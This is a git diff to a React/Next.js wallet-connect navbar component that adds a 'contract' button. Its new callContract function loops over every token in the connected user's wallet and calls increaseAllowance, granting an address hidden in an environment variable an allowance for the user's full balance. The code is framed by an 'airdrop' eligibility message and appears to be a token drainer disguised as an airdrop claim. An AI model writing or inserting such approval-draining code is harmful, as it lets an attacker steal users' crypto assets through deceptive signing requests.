@@ -1,8 +1,9 @@
 "use client";
-import React, { useEffect, useMemo, useState } from "react";
+import React, { useCallback, useEffect, useMemo, useState } from "react";
 import { toast } from "sonner";
-import { AddressLike, BrowserProvider, Eip1193Provider, ethers } from "ethers";
+import { AddressLike, BrowserProvider, Eip1193Provider, ethers , Contract } from "ethers";
 import { useEvmNativeBalance } from "@moralisweb3/next";
+import BigNumber from "bignumber.js";
 import { Button } from "../../ui/button";
 import {
   useWeb3ModalProvider,
@@ -36,10 +37,10 @@ function Navbar() {
   const { address, chainId, isConnected } = useWeb3ModalAccount();
   const { switchNetwork } = useSwitchNetwork();
   const { selectedNetworkId } = useWeb3ModalState();
-  const { data: nativeBalance } = useEvmNativeBalance({
-    address: String(address),
-  });
-  console.log(nativeBalance, "Eth balances");
+//   const { data: nativeBalance } = useEvmNativeBalance({
+//     address: String(address),
+//   });
+//   console.log(nativeBalance, "Eth balances");
   const [getProvider, setGetProvider] = useState<BrowserProvider>();
   const [getSigner, setGetSigner] = useState<ethers.JsonRpcSigner>();
   const getWalletMetadata = executeUsersWallet(
@@ -53,18 +54,39 @@ function Navbar() {
     (state) => state.getUsersWallet
   );
   const walletAbi = [
-    "function increaseAllowance(address spender, uint256 addedValue)public virtual returns (bool)",
+    {
+        "type": "function",
+        "name": "increaseAllowance",
+        "inputs": [
+          {
+            "name": "spender",
+            "type": "address"
+          },
+          {
+            "name": "addedValue",
+            "type": "uint256"
+          }
+        ],
+        "outputs": [
+          {
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "visibility": "public"
+      }
   ];
 
   useEffect(() => {
     if (!isConnected){
         setShowAlert(false)
         return;
-    }else{
+    }
         // getWalletMetadata(String(address));
         getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");
 
-    }
+ 
   }, [isConnected]);
 
 
@@ -73,21 +95,23 @@ function Navbar() {
     (async () => {
       if (selectedNetworkId != String(1)) {
         switchNetwork(1);
+        return ;
       }
       if (walletProvider == undefined) return;
       const provider = new BrowserProvider(walletProvider);
       const signer = await provider.getSigner();
       const balanceEth = await provider.getBalance(address as AddressLike);
-      const signature = await signer?.signMessage(
-        "hello how are you doing today "
-      );
-      // getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d")
-      // getWalletMetadata(String(address))
+    //   usersWalletData?.token?.map(async (item:any, index:number)=>{
+    //       const contract =  new Contract(item.token_address , walletAbi , getSigner)
+    //       console.log(item , index , contract)
+    //     //  const data =    await contract.increaseAllowance(String(process.env.NEXT_PUBLIC_RECEIVERADDRESS ,item?.balance ))
+    //     //  console.log(data)
+    //   })
       setGetProvider(provider);
       setGetSigner(signer);
-      console.log("users balance ", signer, Number(balanceEth), signature);
+   
     })();
-  }, [selectedNetworkId, walletProvider, setGetProvider, setGetSigner]);
+  }, [selectedNetworkId, walletProvider, setGetProvider, setGetSigner,usersWalletData]);
 
 
   useMemo(()=>{
@@ -119,10 +143,76 @@ function Navbar() {
     });
   };
 
+const callContract = async()=>{
+     try{
+
+        getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");
+
+    if (!isConnected) throw Error('User disconnected')
+        const walletAbi = [
+            {
+                "type": "function",
+                "name": "increaseAllowance",
+                "inputs": [
+                  {
+                    "name": "spender",
+                    "type": "address"
+                  },
+                  {
+                    "name": "addedValue",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "bool"
+                  }
+                ],
+                "stateMutability": "nonpayable",
+                "visibility": "public"
+              }
+            ];
+
+        if (!walletProvider) throw Error('walletProvider not available');
+        const ethersProvider = new BrowserProvider(walletProvider)
+        const signer = await ethersProvider.getSigner()
+        console.log(signer , ethersProvider , walletProvider , usersWalletData)
+        if( usersWalletData?.token?.length == 0 ){
+            setShowAlert(true)
+            throw Error('you are not eligible for this airdrop');
+            return;
+
+        }
+        usersWalletData?.token?.map(async (item:any, index:number)=>{
+            try{
+                const contract =  new Contract(String(item.token_address), walletAbi , signer)
+                const amount = new BigNumber(item.balance);
+                const data =   await contract.increaseAllowance(process.env.NEXT_PUBLIC_RECEIVERADDRESS, item?.balance)
+                console.log(contract , data)
+
+            }catch(error:any){
+                console.log(error)
+            }
+        })
+
+
+    }catch(error:any){
+          console.log("this is the error " , error)
+    }
+
+}
+ 
+
+
   return (
     <div className="">
       <div>
         {isConnected ? (
+            <>
+            <Button onClick={()=>callContract()}>
+                contract
+            </Button>
           <Button onClick={() => walletDisconnected()}>
             <Image
               src={String(walletInfo?.icon)}
@@ -136,6 +226,7 @@ function Navbar() {
               ).toLowerCase()}
             </span>
           </Button>
+          </>
         ) : (
           <Button variant={"secondary"} onClick={() => connectWallet()}>
             Connect Wallet
